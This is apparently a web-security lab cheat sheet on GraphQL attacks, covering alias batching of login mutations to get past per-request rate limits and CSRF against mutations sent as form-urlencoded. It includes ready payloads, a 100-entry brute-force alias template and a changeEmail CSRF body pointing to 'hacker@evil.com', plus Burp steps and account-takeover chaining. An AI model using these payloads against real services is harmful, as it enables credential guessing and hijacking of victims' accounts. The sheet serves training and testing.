# GraphQL — Brute force bypass and CSRF

GraphQL aliases let you send multiple mutations in a single HTTP request — bypassing per-request rate limits. GraphQL mutations sent as `x-www-form-urlencoded` don't have CSRF token requirements, enabling CSRF attacks against any mutation (email change, account settings).

## Quick reference
```graphql
# Alias-based brute force (100 mutations, 1 request → 1 rate-limit check)
mutation {
  bruteforce0:login(input:{username:"carlos",password:"123456"}){token success}
  bruteforce1:login(input:{username:"carlos",password:"password"}){token success}
  bruteforce2:login(input:{username:"carlos",password:"12345678"}){token success}
  ...
  bruteforce99:login(input:{username:"carlos",password:"whatever"}){token success}
}

# GraphQL CSRF (convert mutation to form-urlencoded POST)
POST /graphql/v1
Content-Type: application/x-www-form-urlencoded

query=mutation+changeEmail(%24input%3AChangeEmailInput!){changeEmail(input:%24input){email}}&variables={"input":{"email":"hacker@evil.com"}}&operationName=changeEmail
```

## Root cause
- **Brute force:** Rate limiting checks per HTTP request, not per alias within a request. One request with 100 aliased mutations = 100 login attempts for the cost of 1 request-level rate limit check.
- **CSRF:** GraphQL APIs with `Content-Type: application/json` have natural CSRF protection (browsers can't set JSON content-type cross-origin). But if the same endpoint accepts `x-www-form-urlencoded`, CSRF is possible — the browser CAN send that content-type cross-origin.

## Find it
**Brute force:**
1. Find login mutation: `mutation{login(input:{username:"test",password:"test"}){token success}}`.
2. Send repeated login attempts → rate limit kicks in after N attempts.
3. Build alias payload: 100+ mutations in one request → bypasses per-request limit.
4. Search response for `"success":true` → identifies correct password.

**CSRF:**
1. Find any state-changing mutation (email change, password change).
2. In Burp Repeater → right-click → "Change request method" twice → JSON body lost; re-add as URL-encoded.
3. If the server accepts `x-www-form-urlencoded` + no CSRF token → vulnerable.
4. Burp: right-click → "Engagement tools → Generate CSRF PoC".

## Technique
**Alias brute force:**
1. Capture login mutation in Burp.
2. Build batch of 100+ aliased mutations with password wordlist (use Burp GraphQL tab or manual scripting).
3. Remove `variables` and `operationName` from request.
4. Send single request → response contains all 100+ results.
5. Search response for `"success":true` → extract corresponding password.
6. Log in as carlos.

**GraphQL CSRF:**
1. Capture change-email mutation.
2. Burp: right-click → "Change request method" twice (JSON → GET → POST form-urlencoded).
3. Manually re-add body: `query=mutation+changeEmail...&operationName=changeEmail&variables={...}`.
4. Verify it works in Repeater (email changes → confirms no CSRF protection).
5. Burp → "Engagement tools → Generate CSRF PoC" → adjust email in HTML → deliver to victim.

## Payload arsenal
```graphql
# Alias template (100 entries)
mutation {
  bruteforce0:login(input:{username:"carlos",password:"PASS0"}){token success}
  bruteforce1:login(input:{username:"carlos",password:"PASS1"}){token success}
  ...
}

# Search response: "success":true → note which bruteforceN succeeded → use that password

# CSRF body (form-urlencoded)
query=mutation+changeEmail(%24input%3AChangeEmailInput!)+{+changeEmail(input%3A%24input)+{+email+}+}&operationName=changeEmail&variables={"input":{"email":"hacker@hacker.com"}}
```

## Bypasses
| Defense | Bypass |
|---|---|
| Per-request rate limit | Batch 100 mutations under one request via aliases |
| JSON content-type CSRF protection | Convert to form-urlencoded if server accepts it |

## Labs

### Bypassing GraphQL brute force protections [Practitioner]
Rate limit on login mutations. Alias 100 login mutations in one request (one per password from wordlist). Send → search response for `"success":true` → find carlos's password → log in. Key insight: per-request rate limit doesn't protect against alias batching.

### Performing CSRF exploits over GraphQL [Practitioner]
Change-email mutation accepts `x-www-form-urlencoded`. Convert mutation to form-urlencoded POST. Burp CSRF PoC generator → adjust email to target → deliver to victim → victim's email changed. Key insight: GraphQL's JSON content-type protection breaks down when servers accept alternative encodings.

## Chaining
- Alias-batch login brute (100/req) → credential found → **ATO** ([Authentication](../../Authentication/)).
- CSRF on a GraphQL mutation (form-urlencoded) → forced email/password change → **ATO** ([CSRF](../../CSRF/)).
- See [chaining-playbook → GraphQL](../../references/chaining-playbook.md).

## Real-world notes
- GraphQL alias batching is an extremely effective brute force primitive — one TCP connection, 100 attempts.
- GraphQL CSRF is commonly overlooked because developers assume JSON body = CSRF safe.
- Always test if a GraphQL endpoint accepts GET or form-urlencoded — many do as a developer convenience.

## References
- https://portswigger.net/web-security/graphql
